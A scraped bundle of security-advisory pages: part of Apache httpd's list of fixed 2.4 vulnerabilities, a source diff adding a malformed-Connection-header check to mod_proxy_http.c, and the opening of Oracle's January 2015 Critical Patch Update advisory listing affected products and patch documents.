| Update 2.2.29 released | 2014-09-03 |
| Affects | 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### moderate: mod\_status buffer overflow ([CVE-2014-0226](https://www.cve.org/CVERecord?id=CVE-2014-0226))

A race condition was found in mod\_status. An attacker able to access a public server status page on a server using a threaded MPM could send a carefully crafted request which could lead to a heap buffer overflow. Note that it is not a default or recommended configuration to have a public accessible server status page.

Acknowledgements: This issue was reported by Marek Kroemeke, AKAT-1 and 22733db72ab3ed94b5f8a1ffcde850251fe6f466 via HP ZDI

| Reported to security team | 2014-05-30 |
| --- | --- |
| Issue public | 2014-07-14 |
| Update 2.4.10 released | 2014-07-15 |
| Update 2.2.29 released | 2014-09-03 |
| Affects | 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### important: mod\_cgid denial of service ([CVE-2014-0231](https://www.cve.org/CVERecord?id=CVE-2014-0231))

A flaw was found in mod\_cgid. If a server using mod\_cgid hosted CGI scripts which did not consume standard input, a remote attacker could cause child processes to hang indefinitely, leading to denial of service.

Acknowledgements: This issue was reported by Rainer Jung of the ASF

| Reported to security team | 2014-06-16 |
| --- | --- |
| Issue public | 2014-07-14 |
| Update 2.4.10 released | 2014-07-15 |
| Update 2.2.29 released | 2014-09-03 |
| Affects | 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.27, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### important: WinNT MPM denial of service ([CVE-2014-3523](https://www.cve.org/CVERecord?id=CVE-2014-3523))

A flaw was found in the WinNT MPM in httpd versions 2.4.1 to 2.4.9, when using the default AcceptFilter for that platform. A remote attacker could send carefully crafted requests that would leak memory and eventually lead to a denial of service against the server.

Acknowledgements: This issue was reported by Jeff Trawick of the ASF

| Reported to security team | 2014-07-01 |
| --- | --- |
| Issue public | 2014-07-15 |
| Update 2.4.10 released | 2014-07-15 |
| Affects | 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 |

# Fixed in Apache HTTP Server 2.4.9

### moderate: mod\_dav crash ([CVE-2013-6438](https://www.cve.org/CVERecord?id=CVE-2013-6438))

XML parsing code in mod\_dav incorrectly calculates the end of the string when removing leading spaces and places a NUL character outside the buffer, causing random crashes. This XML parsing code is only used with DAV provider modules that support DeltaV, of which the only publicly released provider is mod\_dav\_svn.

Acknowledgements: This issue was reported by Ning Zhang & Amin Tora of Neustar

| Reported to security team | 2013-12-10 |
| --- | --- |
| Issue public | 2014-03-17 |
| Update 2.4.9 released | 2014-03-17 |
| Update 2.2.27 released | 2014-03-26 |
| Affects | 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### low: mod\_log\_config crash ([CVE-2014-0098](https://www.cve.org/CVERecord?id=CVE-2014-0098))

A flaw was found in mod\_log\_config. A remote attacker could send a specific truncated cookie causing a crash. This crash would only be a denial of service if using a threaded MPM.

Acknowledgements: This issue was reported by Rainer M Canavan

| Reported to security team | 2014-02-25 |
| --- | --- |
| Issue public | 2014-03-17 |
| Update 2.4.9 released | 2014-03-17 |
| Update 2.2.27 released | 2014-03-26 |
| Affects | 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.26, 2.2.25, 2.2.24, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

# Fixed in Apache HTTP Server 2.4.7

### low: mod\_cache crash ([CVE-2013-4352](https://www.cve.org/CVERecord?id=CVE-2013-4352))

A NULL pointer dereference was found in mod\_cache. A malicious HTTP server could cause a crash in a caching forward proxy configuration. (Note that this vulnerability was fixed in the 2.4.7 release, but the security impact was not disclosed at the time of the release.)

| Reported to security team | 2013-09-14 |
| --- | --- |
| Issue public | 2014-07-14 |
| Update 2.4.7 released | 2013-11-26 |
| Affects | 2.4.6 |

# Fixed in Apache HTTP Server 2.4.6

### moderate: mod\_dav crash ([CVE-2013-1896](https://www.cve.org/CVERecord?id=CVE-2013-1896))

Sending a MERGE request against a URI handled by mod\_dav\_svn with the source href (sent as part of the request body as XML) pointing to a URI that is not configured for DAV will trigger a segfault.

Acknowledgements: This issue was reported by Ben Reser

| Reported to security team | 2013-03-07 |
| --- | --- |
| Issue public | 2013-05-23 |
| Update 2.4.6 released | 2013-07-22 |
| Update 2.2.25 released | 2013-07-22 |
| Affects | 2.4.4, 2.4.3, 2.4.2, 2.4.1, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### moderate: mod\_session\_dbd session fixation flaw ([CVE-2013-2249](https://www.cve.org/CVERecord?id=CVE-2013-2249))

A flaw in mod\_session\_dbd caused it to proceed with save operations for a session without considering the dirty flag and the requirement for a new session ID.

Acknowledgements: This issue was reported by Takashi Sato

| Reported to security team | 2013-05-29 |
| --- | --- |
| Issue public | 2013-07-22 |
| Update 2.4.6 released | 2013-07-22 |
| Affects | 2.4.4, 2.4.3, 2.4.2, 2.4.1 |

# Fixed in Apache HTTP Server 2.4.4

### low: XSS due to unescaped hostnames ([CVE-2012-3499](https://www.cve.org/CVERecord?id=CVE-2012-3499))

Various XSS flaws due to unescaped hostnames and URIs HTML output in mod\_info, mod\_status, mod\_imagemap, mod\_ldap, and mod\_proxy\_ftp.

Acknowledgements: This issue was reported by Niels Heinen of Google

| Reported to security team | 2012-07-11 |
| --- | --- |
| Issue public | 2013-02-18 |
| Update 2.4.4 released | 2013-02-25 |
| Update 2.2.24 released | 2013-02-25 |
| Affects | 2.4.3, 2.4.2, 2.4.1, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### moderate: XSS in mod\_proxy\_balancer ([CVE-2012-4558](https://www.cve.org/CVERecord?id=CVE-2012-4558))

A XSS flaw affected the mod\_proxy\_balancer manager interface.

Acknowledgements: This issue was reported by Niels Heinen of Google

| Reported to security team | 2012-10-07 |
| --- | --- |
| Issue public | 2013-02-18 |
| Update 2.4.4 released | 2013-02-25 |
| Update 2.2.24 released | 2013-02-25 |
| Affects | 2.4.3, 2.4.2, 2.4.1, 2.2.23, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

# Fixed in Apache HTTP Server 2.4.3

### low: XSS in mod\_negotiation when untrusted uploads are supported ([CVE-2012-2687](https://www.cve.org/CVERecord?id=CVE-2012-2687))

Possible XSS for sites which use mod\_negotiation and allow untrusted uploads to locations which have MultiViews enabled. Note: This issue is also known as CVE-2008-0455.

| Reported to security team | 2012-05-31 |
| --- | --- |
| Issue public | 2012-06-13 |
| Update 2.2.23 released | 2012-09-13 |
| Update 2.4.3 released | 2012-08-21 |
| Affects | 2.4.2, 2.4.1, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

### important: Response mixup when using mod\_proxy\_ajp or mod\_proxy\_http ([CVE-2012-3502](https://www.cve.org/CVERecord?id=CVE-2012-3502))

The modules mod\_proxy\_ajp and mod\_proxy\_http did not always close the connection to the back end server when necessary as part of error handling. This could lead to an information disclosure due to a response mixup between users.

| Reported to security team | 2012-08-16 |
| --- | --- |
| Issue public | 2012-08-16 |
| Update 2.4.3 released | 2012-08-21 |
| Affects | 2.4.2, 2.4.1 |

# Fixed in Apache HTTP Server 2.4.2

### low: insecure LD\_LIBRARY\_PATH handling ([CVE-2012-0883](https://www.cve.org/CVERecord?id=CVE-2012-0883))

Insecure handling of LD\_LIBRARY\_PATH was found that could lead to the current working directory to be searched for DSOs. This could allow a local user to execute code as root if an administrator runs apachectl from an untrusted directory.

| Reported to security team | 2012-02-14 |
| --- | --- |
| Issue public | 2012-03-02 |
| Update 2.4.2 released | 2012-04-17 |
| Update 2.2.23 released | 2012-09-13 |
| Affects | 2.4.1, 2.2.22, 2.2.21, 2.2.20, 2.2.19, 2.2.18, 2.2.17, 2.2.16, 2.2.15, 2.2.14, 2.2.13, 2.2.12, 2.2.11, 2.2.10, 2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3, 2.2.2, 2.2.0 |

Copyright © 1997-2025 The Apache Software Foundation.

Apache HTTP Server, Apache, and the Apache feather logo are trademarks of The Apache Software Foundation.



=== Content from svn.apache.org_2d8a96eb_20250125_143724.html ===


| **[/](/viewvc?diff_format=h&view=roots)[[Apache-SVN]](/viewvc/?diff_format=h)/[httpd](/viewvc/httpd/?diff_format=h)/[httpd](/viewvc/httpd/httpd/?diff_format=h)/[trunk](/viewvc/httpd/httpd/trunk/?diff_format=h)/[modules](/viewvc/httpd/httpd/trunk/modules/?diff_format=h)/[proxy](/viewvc/httpd/httpd/trunk/modules/proxy/?diff_format=h)/[mod\_proxy\_http.c](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?diff_format=h&view=log)** |  |
| --- | --- |

[![ViewVC logotype](/vc-static/images/viewvc-logo.png)](http://www.viewvc.org/ "ViewVC Home")
# Diff of /httpd/httpd/trunk/modules/proxy/mod\_proxy\_http.c

[![Parent Directory](/vc-static/images/back_small.png) Parent Directory](/viewvc/httpd/httpd/trunk/modules/proxy/?diff_format=h)
| [![Revision Log](/vc-static/images/log.png) Revision Log](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?diff_format=h&view=log)
| [![View Patch](/vc-static/images/diff.png) Patch](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1599486&r2=1610674&view=patch)

###

|  | revision [1599486](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?diff_format=h&revision=1599486&view=markup) by *ylavic*, Tue Jun 3 11:47:11 2014 UTC | revision [1610674](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?diff_format=h&revision=1610674&view=markup) by *jorton*, Tue Jul 15 12:27:00 2014 UTC |
| --- | --- | --- |
| **#** | **Line 1356**   int ap\_proxy\_http\_process\_response(apr\_p | **Line 1356**   int ap\_proxy\_http\_process\_response(apr\_p |
| [1356](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1356) | \*/ | \*/ |
| [1357](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1357) | if (apr\_date\_checkmask(buffer, "HTTP/#.# ###\*")) { | if (apr\_date\_checkmask(buffer, "HTTP/#.# ###\*")) { |
| [1358](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1358) | int major, minor; | int major, minor; |
| [1359](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1359) |  | int toclose; |
| [1360](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1360) |  |  |
| [1361](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1361) | major = buffer[5] - '0'; | major = buffer[5] - '0'; |
| [1362](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1362) | minor = buffer[7] - '0'; | minor = buffer[7] - '0'; |
| **#** | **Line 1466**   int ap\_proxy\_http\_process\_response(apr\_p | **Line 1467**   int ap\_proxy\_http\_process\_response(apr\_p |
| [1467](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1467) | te = apr\_table\_get(r->headers\_out, "Transfer-Encoding"); | te = apr\_table\_get(r->headers\_out, "Transfer-Encoding"); |
| [1468](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1468) |  |  |
| [1469](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1469) | /\* strip connection listed hop-by-hop headers from response \*/ | /\* strip connection listed hop-by-hop headers from response \*/ |
| [1470](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1470) | backend->close = ap\_proxy\_clear\_connection\_fn(r, r->headers\_out); | toclose = ap\_proxy\_clear\_connection\_fn(r, r->headers\_out); |
| [1471](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1471) |  | backend->close = (toclose != 0); |
| [1472](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1472) |  | if (toclose < 0) { |
| [1473](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1473) |  | return ap\_proxyerror(r, HTTP\_BAD\_REQUEST, |
| [1474](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1474) |  | "Malformed connection header"); |
| [1475](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1475) |  | } |
| [1476](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1476) |  |  |
| [1477](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1477) | if ((buf = apr\_table\_get(r->headers\_out, "Content-Type"))) { | if ((buf = apr\_table\_get(r->headers\_out, "Content-Type"))) { |
| [1478](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1610674&diff_format=h#l1478) | ap\_set\_content\_type(r, apr\_pstrdup(p, buf)); | ap\_set\_content\_type(r, apr\_pstrdup(p, buf)); |

---

| Colored Diff Long Colored Diff Full Colored Diff Unidiff Context Diff Side by Side | | Legend:  | Removed from v.1599486 |  | | --- | --- | | changed lines | | |  | Added in v.1610674 | | | --- | --- | --- | --- | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

---

| infrastructure at apache.org | **[ViewVC Help](/vc-static/help_rootview.html)** |
| --- | --- |
| Powered by [ViewVC 1.1.26](http://viewvc.tigris.org/) |  |



=== Content from www.oracle.com_ec25c664_20250125_143738.html ===


* [Skip to content](#maincontent)
* [Accessibility Policy](https://www.oracle.com/corporate/accessibility/)

Products
Industries
Resources
Customers
Partners
Developers
Company

Close Search

Search Oracle.com

* QUICK LINKS
* [Oracle Cloud Infrastructure](/cloud/)
* [Oracle Fusion Cloud Applications](/applications/)
* [Oracle Database](/database/technologies/)
* [Download Java](/java/technologies/downloads/)
* [Careers at Oracle](/careers/)

Search

[Country
![]()](/countries-list.html#countries)

View Accounts

Back
Cloud Account
[Sign in to Cloud](/cloud/sign-in.html)
[Sign Up for Free Cloud Tier](/cloud/free/)

Oracle Account

* [Sign-In](https://www.oracle.com/webapps/redirect/signon?nexturl=)
* [Create an Account](https://profile.oracle.com/myprofile/account/create-account.jspx)

* [Help](/corporate/contact/help.html)
* Sign Out

[Contact Sales](/corporate/contact/ "Contact Sales")

[Menu

Menu](/global-menu-v2/)

* [Security Alerts](/security-alerts/)

# Oracle Critical Patch Update Advisory - January 2015

## Oracle Critical Patch Update Advisory - January 2015

### Description

A Critical Patch Update (CPU) is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

[Critical Patch Updates and Security Alerts](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore *strongly* recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes *without* delay.**

This Critical Patch Update contains 169 new security fixes across the product families listed below. Please note that a blog entry summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at <https://blogs.oracle.com/security>.

Please note that on October 16, 2014, Oracle released information for  [CVE-2014-3566 "POODLE"](/security-alerts/poodlecve-2014-3566.html) .Customers of affected Oracle products are strongly advised to apply the fixes and/or configuration steps that were announced for CVE-2014-3566 in addition to the fixes announced in this CPU.

This Critical Patch Update advisory is also available in an XML format that conforms to the Common Vulnerability Reporting Format (CVRF) version 1.1. More information about Oracle's use of CVRF is available at:  [https://www.oracle.com/security-alerts/cpufaq.html#CVRF](/security-alerts/cpufaq.html#CVRF).

### Affected Products and Components

Security vulnerabilities addressed by this Critical Patch Update affect the products listed in the categories below. The product area of the patches for the listed versions is shown in the Patch Availability column corresponding to the specified Products and Versions column. Please click on the link in the Patch Availability column below or in the  [Patch Availability Table](https:///security-alerts/cpujan2015.html#PIN) to access the documentation for those patches.

The list of affected product releases and versions that are in Premier Support or Extended Support, under the  [Oracle Lifetime Support Policy](https://www.oracle.com/support/lifetime-support/) is as follows:

| Affected Products and Versions | Patch Availability |
| --- | --- |
| Oracle Database Server, version(s) 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, 12.1.0.2 | [Database](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Fusion Middleware, version(s) 10.1.3.5, 11.1.1.7, 11.1.2.1, 11.1.2.2, 12.1.2, 12.1.3 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Fusion Applications, versions 11.1.2 through 11.1.9 | [Fusion Applications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955858.1) |
| Oracle Access Manager, version(s) 11.1.1.5, 11.1.1.7, 11.1.2.1, 11.1.2.2 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Adaptive Access Manager, version(s) 11.1.1.5, 11.1.1.7, 11.1.2.1, 11.1.2.2 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle BI Publisher, version(s) 10.1.3.4.2, 11.1.1.7 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Business Intelligence Enterprise Edition, version(s) 10.1.3.4.2, 11.1.1.7 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Containers for J2EE, version(s) 10.1.3.5 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Directory Server Enterprise Edition, version(s) 7.0, 11.1.1.7 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Exalogic Infrastructure, version(s) 2.0.6.2.0 (for all X2-2, X3-2, X4-2) | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Forms, version(s) 11.1.1.7, 11.1.2.1, 11.1.2.2 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle GlassFish Server, version(s) 3.0.1, 3.1.2 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle HTTP Server, version(s) 10.1.3.5.0, 11.1.1.7.0, 12.1.2.0, 12.1.3.0 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle OpenSSO, version(s) 8.0 Update 2 Patch 5 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Real-Time Decision Server, version(s) 11.1.1.7, RTD Platform 3.0.x | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Reports Developer, version(s) 11.1.1.7, 11.1.2.2 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle SOA Suite, version(s) 11.1.1.7, 12.1.3.0 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Waveset, version(s) 8.1.1 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle WebCenter Content, version(s) 11.1.1.8.0 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle WebLogic Portal, version(s) 10.0.1.0, 10.2.1.0, 10.3.6.0 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle WebLogic Server, version(s) 10.0.2.0, 10.3.6.0, 12.1.1.0, 12.1.2.0, 12.1.3.0 | [Fusion Middleware](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Enterprise Manager Base Platform, version(s) 12.1.0.3, 12.1.0.4 | [Enterprise Manager](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Enterprise Manager Ops Center, version(s) 11.1, 11.1.3, 12.1, 12.1.4, 12.2 | [Enterprise Manager](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle E-Business Suite, version(s) 11.5.10.2, 12.0.4, 12.0.5, 12.0.6, 12.1.1, 12.1.2, 12.1.3, 12.2.2, 12.2.3, 12.2.4 | [E-Business Suite](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1954250.1) |
| Oracle Agile PLM, version(s) 9.3.3 | [Oracle Supply Chain](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955920.1 ) |
| Oracle Agile PLM for Process, version(s) 6.1.0.3 | [Oracle Supply Chain](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955920.1 ) |
| Oracle Transportation Management, version(s) 6.1, 6.2, 6.3.0, 6.3.1, 6.3.2, 6.3.3, 6.3.4, 6.3.5 | [Oracle Supply Chain](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955920.1 ) |
| PeopleSoft Enterprise HRMS, version(s) 9.1 | [PeopleSoft](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955920.1 ) |
| PeopleSoft Enterprise PeopleTools, version(s) 8.52, 8.53, 8.54 | [PeopleSoft](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955920.1 ) |
| JD Edwards EnterpriseOne Tools, version(s) 9.1.5 | [JD Edwards](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955920.1 ) |
| Oracle Enterprise Asset Management, version(s) 8.1.1, 8.2.2 | [Siebel](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955920.1 ) |
| Siebel Applications, version(s) 8.1.1, 8.2.2 | [Siebel](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955920.1 ) |
| Oracle iLearning, version(s) 6.0, 6.1 | [iLearning](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955920.1 ) |
| Oracle Communications Diameter Signaling Router, version(s) 3.x, 4.x, 5.0 | [Communications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1958369.1) |
| Oracle Communications Messaging Server, version(s) 7.0.5.33.0 and prior | [Communications](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1958369.1) |
| Oracle MICROS Retail, version(s) Xstore: 3.2.1, 3.4.2, 3.5.0, 4.0.1, 4.5.1, 4.8.0, 5.0.3, 5.5.3, 6.0.6, 6.5.2 | [Retail](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955864.1) |
| Oracle Healthcare Master Person Index, version(s) 1.x, 2.x | [Health Sciences](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1958531.1) |
| Oracle Java SE, version(s) 5.0u75, 6u85, 7u72, 8u25 | [Oracle Java SE](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1948935.1) |
| Oracle Java SE Embedded, version(s) 7u71, 8u6 | [Oracle Java SE](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1948935.1) |
| Oracle JRockit, version(s) R27.8.4, R28.3.4 | [Oracle Java SE](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1948935.1) |
| Fujitsu M10-1, M10-4, M10-4S Servers, version(s) prior to XCP 2240 | [Oracle and Sun Systems Products Suite](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1956176.1) |
| Integrated Lights Out Manager(ILOM), version(s) prior to 3.2.4 | [Oracle and Sun Systems Products Suite](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1956176.1) |
| Solaris, version(s) 10, 11 | [Oracle and Sun Systems Products Suite](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1956176.1) |
| Solaris Cluster, version(s) 3.3, 4.1 | [Oracle and Sun Systems Products Suite](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1956176.1) |
| SPARC Enterprise M3000, M4000, M5000, M8000, M9000 Servers, version(s) before XCP 1119 | [Oracle and Sun Systems Products Suite](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1956176.1) |
| Oracle Secure Global Desktop, version(s) 4.63, 4.71, 5.0, 5.1 | [Oracle Linux and Virtualization](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955899.1) |
| Oracle VM VirtualBox, version(s) prior to 3.2.26, 4.0.28, 4.1.36, 4.2.28, 4.3.20 | [Oracle Linux and Virtualization](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955899.1) |
| MySQL Server, version(s) 5.5.40 and prior, 5.6.21 and prior | [Oracle MySQL Product Suite](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1956125.1) |

### Patch Availability Table and Risk Matrices

#### Patch Availability Table

For each administered Oracle product, consult the documentation for patch availability information and installation instructions referenced from the following table. For an overview of the Oracle product documentation related to this Critical Patch Update, please refer to the Oracle Critical Patch Update January 2015 Documentation Map, [My Oracle Support Note 1935468.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1935468.1).

| Product Group | Risk Matrix | Patch Availability and Installation Information |
| --- | --- | --- |
| Oracle Database | [Oracle Database Risk Matrix](#AppendixDB) | Patch Set Update and Critical Patch Update January 2015 Availability Document, [My Oracle Support Note 1942215.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Fusion Middleware | [Oracle Fusion Middleware Risk Matrix](#AppendixFMW) | Patch Set Update and Critical Patch Update January 2015 Availability Document, [My Oracle Support Note 1942215.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Fusion Applications | [Oracle Database Risk Matrix](#AppendixDB) and [Oracle Fusion Middleware Risk Matrix](#AppendixFMW) | Vulnerabilities affecting [Oracle Database](#AppendixDB) and [Oracle Fusion Applications](#AppendixFMW) may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document (January 2015) [My Oracle Support Note 1955858.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1955858.1) for information on patches to be applied to Fusion Application environments. |
| Oracle Enterprise Manager | [Oracle Enterprise Manage Risk Matrix](#AppendixEM) | Patch Set Update and Critical Patch Update January 2015 Availability Document, [My Oracle Support Note 1942215.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1 ) |
| Oracle Applications - E-Business Suite | [Oracle E-Business Suite Risk Matrix](#AppendixEBS) | Patch Set Update and Critical Patch Update January 2015 Availability Document, [My Oracle Support Note 1954250.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1954250.1) |
